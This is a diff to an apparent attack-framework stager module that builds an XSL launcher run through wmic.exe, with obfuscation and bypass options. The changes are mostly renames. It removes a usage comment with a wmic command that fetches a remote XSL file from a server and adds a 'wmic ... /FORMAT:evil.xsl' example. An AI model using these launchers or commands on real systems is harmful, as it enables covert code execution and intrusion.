@@ -19,10 +19,8 @@ class Stager:
                     "Link": "https://twitter.com/mattifestation",
                 },
             ],
-            "Description": "Generates an XSL stylesheets file to be run with wmic.exe",
-            "Comments": [
-                'On the endpoint simply launch wmic os get /format:"http://server/launcher.xsl"'
-            ],
+            "Description": "Generates an XSL stylesheets file to be run with wmic.exe. Example: wmic process list /FORMAT:evil.xsl",
+            "Comments": [],
         }
 
         self.options = {
@@ -49,14 +47,14 @@ class Stager:
                 "Value": "launcher.xsl",
             },
             "Base64": {
-                "Description": "Switch. Base64 encode the output.",
+                "Description": "Base64 encode the output.",
                 "Required": True,
                 "Value": "True",
                 "SuggestedValues": ["True", "False"],
                 "Strict": True,
             },
             "Obfuscate": {
-                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
+                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                 "Required": False,
                 "Value": "False",
                 "SuggestedValues": ["True", "False"],
@@ -92,7 +90,6 @@ class Stager:
         self.mainMenu = mainMenu
 
     def generate(self):
-        # extract all of our options
         language = self.options["Language"]["Value"]
         listener_name = self.options["Listener"]["Value"]
         base64 = self.options["Base64"]["Value"]
@@ -123,7 +120,7 @@ class Stager:
                 )
                 return ""
 
-            launcher = self.mainMenu.stagers.generate_exe_oneliner(
+            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                 language=language,
                 obfuscate=obfuscate_script,
                 obfuscation_command=obfuscate_command,
@@ -131,16 +128,16 @@ class Stager:
                 listener_name=listener_name,
             )
         elif language == "powershell":
-            launcher = self.mainMenu.stagers.generate_launcher(
+            launcher = self.mainMenu.stagergenv2.generate_launcher(
                 listener_name,
                 language=language,
                 encode=encode,
                 obfuscate=obfuscate_script,
                 obfuscation_command=obfuscate_command,
-                userAgent=user_agent,
+                user_agent=user_agent,
                 proxy=proxy,
-                proxyCreds=proxy_creds,
-                stagerRetries=stager_retries,
+                proxy_creds=proxy_creds,
+                stager_retries=stager_retries,
                 bypasses=self.options["Bypasses"]["Value"],
             )
 
